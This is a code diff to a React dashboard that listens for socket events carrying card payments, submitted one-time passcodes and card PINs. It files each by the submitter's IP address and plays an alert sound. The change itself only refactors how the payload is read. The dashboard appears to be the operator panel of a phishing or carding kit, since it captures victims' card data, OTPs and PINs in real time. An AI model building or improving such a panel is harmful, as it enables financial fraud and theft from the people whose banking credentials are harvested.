@@ -56,7 +56,10 @@ export default function Dashboard() {
 
     socket.on('newPayment', (data) => {
       console.log('💳 New payment:', data);
-      updateCustomerData(data.ip, 'payments', data);
+      // Extract actual payment data from payload
+      const paymentData = data.payload || data;
+      const ip = paymentData.ip || data.ip;
+      updateCustomerData(ip, 'payments', paymentData);
       playCardDataSound();
     });
 
@@ -78,13 +81,19 @@ export default function Dashboard() {
 
     socket.on('otpSubmitted', (data) => {
       console.log('🔐 OTP submitted:', data);
-      updateCustomerData(data.ip, 'otpCodes', data);
+      // Extract actual OTP data from payload
+      const otpData = data.payload || data;
+      const ip = otpData.ip || data.ip;
+      updateCustomerData(ip, 'otpCodes', otpData);
       playOTPSound();
     });
 
     socket.on('pinSubmitted', (data) => {
       console.log('🔑 PIN submitted:', data);
-      updateCustomerData(data.ip, 'pinCodes', data);
+      // Extract actual PIN data from payload
+      const pinData = data.payload || data;
+      const ip = pinData.ip || data.ip;
+      updateCustomerData(ip, 'pinCodes', pinData);
       playPINSound();
     });
 
